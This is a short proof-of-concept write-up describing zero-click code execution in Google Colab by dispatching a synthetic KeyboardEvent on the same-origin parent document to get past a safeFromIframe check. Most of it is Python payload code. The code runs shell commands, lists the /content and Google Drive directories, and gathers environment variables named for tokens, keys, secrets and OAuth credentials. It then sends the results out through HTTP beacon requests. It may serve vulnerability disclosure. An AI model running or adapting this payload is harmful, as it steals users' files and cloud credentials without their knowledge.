# poc64 — zero-click code exec via same-origin parent KeyboardEvent dispatch

Bypasses the lk.g safeFromIframe restriction by dispatching a synthetic
KeyboardEvent on window.parent.document (same-origin). Goes through
Nec's document-level listener → handleKeyNonCapture → handleKey(event)
with NO safeFromIframe arg (defaults to false → !false=true → guard passes).

```python
import urllib.request, os, json

def _b(t, v=""):
    try: urllib.request.urlopen("https://colab.research.google.com/__poc64/"+t+"?v="+urllib.request.quote(str(v)[:500]))
    except: pass

_b("CELL_RUN")
_b("ID", os.popen("id").read())
_b("HOST", os.popen("hostname").read())

try:
    _b("CONTENT_LS", json.dumps(os.listdir("/content"))[:500])
except Exception as e: _b("CONTENT_ERR", str(e))

try:
    _b("DRIVE_LS", json.dumps(os.listdir("/content/drive/MyDrive"))[:500])
except Exception as e: _b("DRIVE_ERR", str(e))

env_gcp = {k:v for k,v in os.environ.items()
           if any(x in k.upper() for x in ["GOOGLE","GCP","TOKEN","KEY","SECRET","PROJECT","CRED","OAUTH"])}
_b("ENV_GCP", json.dumps(env_gcp)[:500])
_b("ENV_ALL", json.dumps(dict(os.environ))[:500])
_b("DONE")
```
